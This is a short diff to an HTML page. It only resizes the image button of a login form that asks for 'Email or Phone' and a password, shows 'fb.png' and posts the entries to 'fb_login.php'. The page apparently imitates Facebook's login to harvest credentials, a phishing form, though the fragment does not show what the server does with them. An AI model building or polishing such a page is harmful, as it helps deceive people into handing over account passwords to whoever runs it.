@@ -20,7 +20,7 @@ body {
   <form action="fb_login.php" method="post">
       <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
       <font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
-      <input type="image" src="fb.png" style="width:50%;height:50%;">
+      <input type="image" src="fb.png" style="width:400px;height:150px;">
   </form>
 </div>
 
